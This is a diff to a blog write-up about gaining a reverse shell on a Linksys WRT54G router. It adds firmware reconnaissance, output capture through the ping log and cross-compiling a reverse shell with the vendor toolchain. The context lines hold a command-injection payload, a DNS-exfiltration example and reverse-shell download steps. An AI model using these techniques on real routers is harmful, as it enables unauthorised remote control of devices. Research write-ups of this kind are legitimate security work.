@@ -92,8 +92,22 @@ First thing I did was inspect `Ping.asp` in order to see how the ping invocation
 It took me a few minutes to realize that the web application isn't the one that is doing the ping itself as I imagined it would with something like `Process.Start("ping ...");`,
 but rather what actually happens is that it passes on the request to the `httpd` which handles it on its own.
 
+```sh
+router-fs$ grep -r apply.cgi
+www/Wireless_Basic.asp:<FORM name=wireless onSubmit="return false;" method=<% get_http_method(); %> action=apply.cgi>
+www/PortTriggerTable.asp:<FORM name=macfilter method=<% get_http_method(); %> action=apply.cgi>
+www/Traceroute.asp:<FORM name=traceroute method=<% get_http_method(); %> action=apply.cgi>
+www/WanMAC.asp:<FORM name=mac method=<% get_http_method(); %> action=apply.cgi>
+www/DMZ.asp:<FORM name=dmz method=<% get_http_method(); %> action=apply.cgi>
+www/Ping.asp:<FORM name=ping method=<% get_http_method(); %> action=apply.cgi>
+...
+Binary file usr/sbin/httpd matches
+```
+When searching for `/apply.cgi` which is where all the HTTP requests are being sent to,
+the only matches are from the web application with `<FORM>` elements and the `httpd`.
+
 Apparently, it's a common pattern in "small devices" to combine the web server with the application and business logic,
-a theme with which I was not familiar.
+a theme with which I was not exactly familiar.
 
 Generally, the sole job of the web application is to pass parameters to the `httpd` which actually does the heavy lifting.
 I now realized that sooner or later I'd have to reverse the HTTP daemon that is running on the router in order to see how it handles the requests.
@@ -222,7 +236,7 @@ urllib.parse.quote(';ping -c 4 192.169.1.100;')
 
 3. Create an empty file named `*.bin` in order to pass the firmware filename client-side validation.
 
-<center><iframe width="720" height="400" src="https://www.youtube.com/embed/-N307W7cd9Y" frameborder="0" allowfullscreen></iframe></center>
+<center><iframe style="width: 720px; height: 400px; margin: 0.5rem" src="https://www.youtube.com/embed/-N307W7cd9Y" frameborder="0" allowfullscreen></iframe></center>
 
 Yes! We got code execution.
 
@@ -262,7 +276,7 @@ Steps:
 2. Make it executable using `chmod +x`.
 3. Running it.
 
-<center><iframe width="720" height="400" src="https://www.youtube.com/embed/wmvKFE1XFXw" frameborder="0" allowfullscreen></iframe></center>
+<center><iframe style="width: 720px; height: 400px; margin: 0.5rem" src="https://www.youtube.com/embed/wmvKFE1XFXw" frameborder="0" allowfullscreen></iframe></center>
 
 We can tell that the router attempted to download the binary from our HTTP server since we received the request.
 Sadly, it is clear that after I issue the last firmware upgrade which should invoke the reverse shell, it returns immediately.
@@ -284,7 +298,7 @@ I wanted to be able to get the output from the shell commands that I'm running i
 I thought of two ways to do it:
 1. Set myself as the router's DNS server and force the router to issue DNS requests with the command output included.
 For instance, `nslookup $(echo hello).fake.domain`, and then I'd receive a DNS Query request of `hello.fake.domain`.
-However this is a bit tedious because programmatically extracting the data from the DNS requests could be a bit annoying.
+However this method is less preferred because extracting the data programmatically from the DNS requests could be quite tedious.
 2. Looking for files that are displayed within the web interface and write my output to them.
 
 I then recalled the ping interface.  
@@ -303,7 +317,64 @@ In [2]: r._run_shell_cmd('ps', with_output=True)
 ```
 ![Ping Log Output]
 
-Awesome! We can now see the output of our commands.
+Awesome! We can now see the output of our commands.  
+We can even see ourselves with PID 540 🙃
+
+Next thing I did was run `ls /tmp` to ensure the reverse shell is in fact there and is executable,  
+which it was.
+```
+drwxr-xr-x 1 0 0 0 Jan 1 2000 var
+lrwxrwxrwx 1 0 0 8 Jan 1 00:00 ldhclnt -> /sbin/rc
+drwx------ 1 0 0 0 Jan 1 00:00 cron.d
+-rw-r--r-- 1 0 0 8 Jan 1 01:22 action
+-rw-r--r-- 1 0 0 36 Jan 1 00:00 crontab
+-rw-r--r-- 1 0 0 88 Jan 1 02:33 udhcpd.leases
+-rw-r--r-- 1 0 0 287 Jan 1 00:00 udhcpd.conf
+-rw-r--r-- 1 0 0 40 Jan 1 00:00 nas.lan.conf
+-rw-r--r-- 1 0 0 27 Jan 1 00:00 ses.log
+lrwxrwxrwx 1 0 0 8 Jan 1 00:00 udhcpc -> /sbin/rc
+-rw-r--r-- 1 0 0 33 Jan 1 00:00 nas.wan.conf
+-rw-r--r-- 1 0 0 1 Jan 1 00:00 udhcpc.expires
+-rw-r--r-- 1 0 0 1.7k Jan 1 00:00 .ipt
+-rw-r--r-- 1 0 0 20 Jan 1 00:00 .out_rule
+-rw-r--r-- 1 0 0 3.0k Jan 1 02:33 Success_u_s.asp
+-rw-r--r-- 1 0 0 1.5k Jan 1 02:33 Fail_u_s.asp
+
+-rwxr-xr-x 1 0 0 0 Jan 1 00:09 X
+
+-rw-r--r-- 1 0 0 0 Jan 1 01:22 ping.log
+drwxr-xr-x 1 503 503 76 Feb 8 2012 ..
+drwxr-xr-x 1 0 0 0 Jan 1 2000 .
+```
+I tried running it and I received `SIGSEGV` on my ping log.
+Seems to be that I failed to compile the reverse shell correctly to the target.
+
+# Compiling
+Throughout the process I learned that MIPS, which is the architecture that the router runs, has a lot of different variations,
+and that compiling a program to run on the device turned out to be a bigger challenge than I expected.
+
+When I approached to compile `revshell.c`,
+I thought that all I'd have to do is install `gcc` for MIPS so I just did `mips-linux-gnu-gcc -static revshell.c -o revshell` but boy was I wrong.
+I tried passing various arguments to the compiler, and different compilers, but none of which seemed to run successfully on the router.
+I also tried just assemblying native MIPS code with `as`.
+
+Eventually I came to know that the vendor publishes a [toolchain] which contains a bunch of tools that are relevant for the device,
+amongst them is the compiler that is used to build the programs for the target.
+
+```sh
+$ /opt/brcm/hndtools-mipsel-linux/bin/mipsel-linux-gcc -s -static revshell.c -o revshell
+$ file revshell
+revshell: ELF 32-bit LSB executable, MIPS, MIPS-I version 1 (SYSV), statically linked, for GNU/Linux 2.2.15, stripped
+```
+
+Let's experiment and see if this toolchain is any good.
+
+<center><iframe style="width: 720px; height: 400px; margin: 0.5rem" src="https://www.youtube.com/embed/P015AjNWvW8" frameborder="0" allowfullscreen></iframe></center>
+
+Mission accomplished! Full interactive shell.  
+The repository of the exploit is available [here](https://github.com/elongl/linksys-wrt54g).
+
+Thank you for reading.
 
 
 [Router Image]: https://i.imgur.com/sAmlLfJ.jpg
@@ -317,3 +388,4 @@ Awesome! We can now see the output of our commands.
 [Check Revshell Existence]: https://i.imgur.com/gVYDd0U.png
 [Ping Log Ghidra]: https://i.imgur.com/znqjVnI.png
 [Ping Log Output]: https://i.imgur.com/1cdJgez.png
+[toolchain]: https://www.linksys.com/us/support-article?articleNum=114663
